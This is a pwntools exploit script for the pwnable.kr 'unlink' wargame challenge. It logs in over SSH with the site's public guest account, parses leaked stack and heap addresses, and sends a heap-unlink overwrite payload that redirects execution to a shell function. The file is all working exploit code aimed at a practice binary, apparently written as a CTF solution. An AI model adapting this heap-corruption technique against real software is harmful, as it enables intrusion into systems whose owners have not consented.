from pwn import *
remote = 1
if remote :
    s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest' )
    p = s.process('./unlink')
else:
    p = process('./unlink')
# leak = r.recvuntil('shell!\n')
# stack_addr = int(leak.split('leak: 0x')[1][:8], 16)
# heap_addr = int(leak.split('leak: 0x')[2][:8], 16)
stack_addr = p.recvuntil('ere is stack address leak: ')
stack_addr = int(p.recv(10),16)
log.info(hex(stack_addr))

heap_addr = p.recvuntil('here is heap address leak: ')
heap_addr = int(p.recv(10),16)
log.info(hex(heap_addr))

shell_addr = 0x080484EB
payload = p32(shell_addr) + 'A'*0x4 + '\x00'*0x4 + p32(0x19) + p32(stack_addr + 0x14 -0x4-0x4) + p32(heap_addr+0x8 +0x4)
#gdb.attach(pidof(p)[0],'b *0x080485F2')
p.sendline(payload)
p.interactive() 